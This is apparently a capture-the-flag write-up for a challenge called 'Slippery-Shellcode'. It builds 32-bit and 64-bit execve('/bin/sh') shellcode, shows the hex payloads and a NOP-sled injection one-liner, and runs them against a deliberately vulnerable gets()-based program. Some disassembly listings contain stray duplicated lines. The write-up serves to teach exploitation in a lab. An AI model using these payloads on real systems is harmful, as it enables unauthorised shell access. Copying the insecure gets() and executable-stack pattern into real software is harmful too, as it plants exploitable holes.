# Slippery-Shellcode

> Can you spawn a shell and use that to read the flag.txt?

Program:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 512
#define FLAGSIZE 128

void vuln(char *buf){
  gets(buf);
  puts(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);

  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  char buf[BUFSIZE];

  puts("Enter your shellcode:");
  vuln(buf);

  puts("Thanks! Executing from a random location now...");

  int offset = (rand() % 256) + 1;

  ((void (*)())(buf+offset))();


  puts("Finishing Executing Shellcode. Exiting now...");

  return 0;
}
```

## Solution

From the name and the code it looks like we're going to need to write and
inject some shellcode. Specifically, shellcode that can spawn a shell.

Before writing anything we should check the architecture we're working with,
logging onto the machine and checking the file we see:

```
$ file vuln
vuln: setgid ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=df86b06c60f9f6b307f6d381d8498245c4d3691c, not stripped
```

So we will need to write 32bit shellcode.

### Constructing Shellcode

The simplest way I know to open a shell would be to make a call to
[`execve`](https://linux.die.net/man/2/execve), e.g. `execve("/bin/sh", NULL,
NULL)`. Let's write a program in assembly to make this call:

```asm
; in shell32.asm
; program to call execve("/bin/sh", NULL, NULL)

; syscalls under 32bit linux:
;   eax - syscall code
;   ebx - first arg
;   ecx - second arg
;   edx - third arg
; https://en.wikibooks.org/wiki/X86_Assembly/Interfacing_with_Linux

global _start
_start:
    ; build syscall:
    ; you can find tables for syscall codes online
    mov eax, 0xb    ; execve(
    mov ebx, path   ; "/bin/sh",
    mov ecx, 0x0    ; NULL,
    mov edx, 0x0    ; NULL)
    int 0x80        ; make the syscall

section .rodata
    path: db "/bin/sh"
```

Testing our program:

```
$ nasm -f elf32 -o shell32.o shell32.asm
$ ld -m elf_i386 -o shell32 shell32.o
$ ./shell32
$ ps -p $$
  PID TTY          TIME CMD
14181 pts/2    00:00:00 sh
```

Great, we spawned a new shell like we expected. Though we will need to make
some adjustments before we can write our program as shellcode. First let's look
at what we've made

```
$ objdump -dM intel shell32

basic_shell32:     file format elf32-i386


Disassembly of section .text:

08049000 <_start>:
 8049000:	b8 0b 00 00 00       	mov    eax,0xb
 8049005:	bb 00 a0 04 08       	mov    ebx,0x804a000 <----- assembler gives us this address
 804900a:	b9 00 00 00 00       	mov    ecx,0x0
 804900f:	ba 00 00 00 00       	mov    edx,0x0
 8049014:	cd 80                	int    0x80
```

Since we stored our `path` in a separate section (`.rodata`) the assembler
kindly passed the address of this to our `_start` section to our `mov ebx,
path` instruction. Unfortunately, this means we will not be able to inject this
program as shellcode as the program running the shellcode won't have this value
stored in that location of memory.

Let's rewrite with more direct access to the string we want to pass as the
path:

```asm
global _start
_start:

    ; push our string onto the stack
    push 0x0        ; null byte, terminate our string
    push 0x68732f2f ; "//sh"
    push 0x6e69622f ; "/bin"
    ; stack now looks something like:
    ; -----------
    ; | "/bin" |
    ; | "//sh" |
    ; |  "\0"  | 
    ; | ...... |
    ; ----------

    ; build syscall:
    ; you can find tables for syscall codes online
    mov eax, 0xb    ; execve(
    ; make ebx "point at" the top of the stack (our path)
    mov ebx, esp    ; "/bin/sh",
    mov ecx, 0x0    ; NULL,
    mov edx, 0x0    ; NULL)
    int 0x80        ; make the syscall
```

Assembling and running our program as before, and we see it works. Let's
inspect again:

```
$ objdump -dM intel shell32

shell32_usable:     file format elf32-i386


Disassembly of section .text:

08049000 <_start>:
 8049000:	6a 00                	push   0x0
 8049002:	68 2f 2f 73 68       	push   0x68732f2f
 8049007:	68 2f 62 69 6e       	push   0x6e69622f
 804900c:	b8 0b 00 00 00       	mov    eax,0xb
 8049011:	89 e3                	mov    ebx,esp
 8049013:	b9 00 00 00 00       	mov    ecx,0x0
 8049018:	ba 00 00 00 00       	mov    edx,0x0
 804901d:	cd 80                	int    0x80
```

Great, We can see the values for our string being stored directly (first three
instructions). We _should_ be able to run this as shellcode, let's give it a
try, firstly extract just the hex:

```
$ objdump -d shell32 | \
    awk -F'\t' '{print $2}' | \
    tr -d '\n' | \
    sed \
        -e 's/[^ ]\{2\}/\\x&/g' \
        -e 's/ \+//g' \
        -e 's/$/\n/'
\x6a\x00\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\xb8\x0b\x00\x00\x00\x89\xe3\xb9\x00\x00\x00\x00\xba\x00\x00\x00\x00\xcd\x80
```

Let's write a program to verify our shell code:


```c
// test.c
const char code[] = "\x6a\x00\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\xb8\x0b"
                    "\x00\x00\x00\x89\xe3\xb9\x00\x00\x00\x00\xba\x00\x00\x00"
                    "\x00\xcd\x80";

int main()
{
    ((void (*)())(code))();
     return 0;
}
```

**Note:** you may need to install a `gcc-multilib` package to be able to compile
32 bit binaries on a 64 bit machine, e.g. for Debian 10: `gcc-8-multilib`

```
$ gcc -z execstack -o test -m32 test.c
```

We need the `-z execstack` to allow us to execute instructions on the stack,
see also [here](https://linux.die.net/man/8/execstack). Now we run our program
and we see our shellcode was successfully injected and spawns us a shell:

```
$ ./test
$ ps -p $$
  PID TTY          TIME CMD
29089 pts/3    00:00:00 sh
```

### Injecting Shellcode

Returning to the challenge, we will need to pass our shellcode via stdin into
the program's buffer. To test our shellcode, let's simplify the challenge by
removing the random padding. We will also remove the 'puts' call since our
shellcode will generate nonsense if printed to stdout, we will also remove the
guid setting since it's not important for this testing.

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 512
#define FLAGSIZE 128

void vuln(char *buf){
  gets(buf);
  //puts(buf); <----- changed
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);

  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  //gid_t gid = getegid();      <----- changed
  //setresgid(gid, gid, gid);   <----- changed

  char buf[BUFSIZE];

  puts("Enter your shellcode:");
  vuln(buf);

  puts("Thanks! Executing from a random location now...");

  int offset = 0; // (rand() % 256) + 1; <---- changed

  ((void (*)())(buf+offset))();


  puts("Finishing Executing Shellcode. Exiting now...");

  return 0;
}
```

Compiling our version of the challenge:

```
$ gcc -m32 -z execstack vuln.c -o vuln
vuln.c: In function ‘vuln’:
vuln.c:11:3: warning: implicit declaration of function ‘gets’; did you mean ‘fgets’? [-Wimplicit-function-declaration]
   gets(buf);
   ^~~~
   fgets
/usr/bin/ld: /tmp/ccd5yz3j.o: in function `vuln':
vuln.c:(.text+0x19): warning: the `gets' function is dangerous and should not be used.

```

I left the warnings in the output here to make it clear that this code is
insecure. Now let's try injecting our shell code:

```
$ echo -e '\x6a\x00\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\xb8\x0b\x00\x00\x00\x89\xe3\xb9\x00\x00\x00\x00\xba\x00\x00\x00\x00\xcd\x80' | ./vuln 
Enter your shellcode:
Thanks! Executing from a random location now...
```

It doesn't look like much happened. Let's investigate with `strace`

```
$ echo -e '\x6a\x00\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\xb8\x0b\x00\x00\x00\x89\xe3\xb9\x00\x00\x00\x00\xba\x00\x00\x00\x00\xcd\x80' | strace ./vuln
<-----SNIP----->
execve("/bin//sh", NULL, NULL)          = 0
<-----SNIP----->
```

So we've made the system call we were hoping for, but didn't see an interactive
shell. The issue is the `echo` command on the left of the pipe executes then
exits, causing the pipe to be closed and exiting the program on the right too.
A simple solution would be to replace this with a command that won't close
instantly, e.g. `cat -`, which will wait for input. Let's try:

```
$ echo -e '\x6a\x00\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\xb8\x0b\x00\x00\x00\x89\xe3\xb9\x00\x00\x00\x00\xba\x00\x00\x00\x00\xcd\x80' > data
cat data - | ./vuln
$ cat data - | ./vuln
Enter your shellcode:
Thanks! Executing from a random location now...
ps -p $$
  PID TTY          TIME CMD
 6114 pts/3    00:00:00 sh
```

And it works! Note that we could've avoided the additional `data` file via
process substitution:

```
$ cat <(echo -e '\x6a\x00\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\xb8\x0b\x00\x00\x00\x89\xe3\xb9\x00\x00\x00\x00\xba\x00\x00\x00\x00\xcd\x80') - | ./vuln
Enter your shellcode:
Thanks! Executing from a random location now...
ps -p $$
  PID TTY          TIME CMD
 6364 pts/3    00:00:00 sh
```

### Applying Shellcode to Challenge

Returning to the challenge, we still need to handle the offset:

```c
  int offset = (rand() % 256) + 1;
  
  ((void (*)())(buf+offset))();
```

So upon successful injection, we don't want to execute from the start of the
buffer, but an offset somewhere between 0-257 bytes in. Since our shellcode is
much smaller than the total buffer size (512 bytes) we can just buffer the code
without having to worry about a buffer overflow. The easiest way to buffer
would be to just add lots of `noop` instructions, which have opcode `0x90`, so
let's try that:

```
$ cat <(perl -E 'say "\x90" x 257 . "\x6a\x00\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\xb8\x0b\x00\x00\x00\x89\xe3\xb9\x00\x00\x00\x00\xba\x00\x00\x00\x00\xcd\x80"') - | ./vuln
```

Which gives us a shell!

## Extra: Null Bytes in Shellcode

Since C interprets null bytes (`0x00`) as marking the end of the string, were
we doing a more complicated shellcode injection that involved overflowing a
buffer it may be necessary to ensure none of these bytes were present in our
payload. From before, our payload is:

```
08049000 <_start>:
 8049000:	6a 00                	push   0x0
 8049002:	68 2f 2f 73 68       	push   0x68732f2f
 8049007:	68 2f 62 69 6e       	push   0x6e69622f
 804900c:	b8 0b 00 00 00       	mov    eax,0xb
 8049011:	89 e3                	mov    ebx,esp
 8049013:	b9 00 00 00 00       	mov    ecx,0x0
 8049018:	ba 00 00 00 00       	mov    edx,0x0
 804901d:	cd 80                	int    0x80
```

Which contains plenty of null bytes. The offending instructions are those
explicitly involving `0x00` (i.e. zeroing registers) and our `mov` commands.

Thankfully, we can simply zero a register by `xor`-ing it with itself, updating
our code (removing comments to make things simpler to read):

```global _start
global _start
_start:

    ; push our string onto the stack
    push 0x0        ; null byte, terminate our string
    push 0x68732f2f ; "//sh"
    push 0x6e69622f ; "/bin"

    ; build syscall:
    ; you can find tables for syscall codes online
    mov eax, 0xb    ; execve(
    mov ebx, esp    ; "/bin/sh",
    xor ecx, ecx    ; NULL,     <----- now with xor
    xor edx, edx    ; NULL)     <----- now with xor
    int 0x80        ; make the syscall
```

Assembling, linking, and running our program and we still get our shell. Let's
inspect our new program:

```
$ objdump -dM intel shell32

./shell32_usable_non_null:     file format elf32-i386


Disassembly of section .text:

08049000 <_start>:
 8049000:	6a 00                	push   0x0
 8049002:	68 2f 2f 73 68       	push   0x68732f2f
 8049007:	68 2f 62 69 6e       	push   0x6e69622f
 804900c:	b8 0b 00 00 00       	mov    eax,0xb
 8049011:	89 e3                	mov    ebx,esp
 8049013:	31 c9                	xor    ecx,ecx
 8049015:	31 d2                	xor    edx,edx
 8049017:	cd 80                	int    0x80
8049020:	cd 80                	int    $0x80
 ```

Our next target is the null-bytes in the `mov` command. Since we're calling
`mov` a on 32-bit register there is extra zero padding, we can avoid this by
zeroing the register ourselves then writing only to the lower bytes we need:

```
global _start
_start:

    ; push our string onto the stack
    push 0x0        ; null byte, terminate our string
    push 0x68732f2f ; "//sh"
    push 0x6e69622f ; "/bin"

    ; build syscall:
    ; you can find tables for syscall codes online
    xor eax, eax    ;           <----- zeroing entire register
    mov al, 0xb     ; execve(   <----- move into lowest byte
    mov ebx, esp    ; "/bin/sh",
    xor ecx, ecx    ; NULL,
    xor edx, edx    ; NULL)
    int 0x80        ; make the syscall
```

Once again, test it works and let's inspect:

```
$ objdump -dM intel shell32

./shell32_usable_non_null:     file format elf32-i386


Disassembly of section .text:

08049000 <_start>:
 8049000:	6a 00                	push   0x0
 8049002:	68 2f 2f 73 68       	push   0x68732f2f
 8049007:	68 2f 62 69 6e       	push   0x6e69622f
 804900c:	31 c0                	xor    eax,eax
 804900e:	b0 0b                	mov    al,0xb
 8049010:	89 e3                	mov    ebx,esp
 8049012:	31 c9                	xor    ecx,ecx
 8049014:	31 d2                	xor    edx,edx
 8049016:	cd 80                	int    0x80
804901e:	cd 80                	int    $0x80
```

Now the only remaining null-byte is that used to define our string, but we have
plenty of zeroed register we can borrow from:

```
global _start
_start:

    ; build syscall:
    ; you can find tables for syscall codes online
    xor eax, eax    ; zero eax
    ; push our string onto the stack
    push eax        ; <----- using zeroed eax as null byte
    push 0x68732f2f ; "//sh"
    push 0x6e69622f ; "/bin"

    mov al, 0xb     ; execve(
    mov ebx, esp    ; "/bin/sh",
    xor ecx, ecx    ; NULL,
    xor edx, edx    ; NULL)
    int 0x80        ; make the syscall
```

And we've cleared out all the null-bytes:

```
$ objdump -dM intel shell32

./shell32_usable_non_null:     file format elf32-i386


Disassembly of section .text:

08049000 <_start>:
 8049000:	31 c0                	xor    eax,eax
 8049002:	50                   	push   eax
 8049003:	68 2f 2f 73 68       	push   0x68732f2f
 8049008:	68 2f 62 69 6e       	push   0x6e69622f
 804900d:	b0 0b                	mov    al,0xb
 804900f:	89 e3                	mov    ebx,esp
 8049011:	31 c9                	xor    ecx,ecx
 8049013:	31 d2                	xor    edx,edx
 8049015:	cd 80                	int    0x80
804901d:	cd 80                	int    $0x80
```

## Extra: 64bit Shellcode

The challenge provided a vulenrable 32bit binary, but let's see how different
things would be if it were a 64 bit binary. First thing's first, let's write
the assembly for our payload. The biggest difference is that if we tried to
push words like we did before onto the stack there would be extra zero-padding,
resulting in null-bytes in our string. There are also different codes for
system calls:

```asm
global _start
_start:
    xor rsi, rsi                ; second parameter, NULL
    xor rdx, rdx                ; third parameter, NULL
    push rdx                    ; null-byte for string

     ; use rax as intermediate when putting string on stack
    mov rax, 0x68732f2f6e69622f ; /bin//sh
    push rax
    mov rdi, rsp                ; first parameter, "/bin//sh\0"

    xor rax, rax
    mov al, 0x3b                ; code for execve
    syscall
```

Assembling, linking, and running:

```
$ nasm -f elf64 -o shell64.o shell64.asm
$ ld -o shell64 shell64.o
$ ./shellcode
$ ps -p $$
  PID TTY          TIME CMD
12552 pts/2    00:00:00 sh
$ exit
```

And we got our shell. You can recompile the test and vulnerability as 64bit
binaries to verify the rest of the challenge works with this payload.
